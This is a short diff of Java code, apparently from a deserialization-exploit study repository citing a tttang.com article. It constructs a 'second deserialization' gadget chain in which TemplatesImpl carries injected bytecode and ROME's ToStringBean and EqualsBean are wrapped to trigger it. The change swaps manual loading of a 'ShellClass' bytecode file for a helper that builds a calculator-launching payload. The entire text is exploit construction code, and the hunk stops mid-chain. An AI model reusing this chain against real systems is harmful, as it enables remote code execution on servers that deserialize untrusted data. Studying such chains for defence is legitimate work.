@@ -24,15 +24,9 @@ import static Seri.Utils.*;
 // https://tttang.com/archive/1701/
 public class 二次反序列化 {
     public static void main(String[] args) throws Exception {
-        TemplatesImpl templatesimpl = new TemplatesImpl();
+        TemplatesImpl templates = Utils.createTemplatesImpl("calc");
 
-        byte[] bytecodes = Files.readAllBytes(Paths.get("target/classes/Seri/ShellClass.class"));
-
-        setValue(templatesimpl,"_name","aaa");
-        setValue(templatesimpl,"_bytecodes",new byte[][] {bytecodes});
-        setValue(templatesimpl, "_tfactory", new TransformerFactoryImpl());
-
-        ToStringBean toStringBean = new ToStringBean(Templates.class,templatesimpl);
+        ToStringBean toStringBean = new ToStringBean(Templates.class,templates);
         ToStringBean fakeToStringBean = new ToStringBean(Templates.class,new TemplatesImpl());
 
         EqualsBean equalsBean = new EqualsBean(ToStringBean.class,toStringBean);
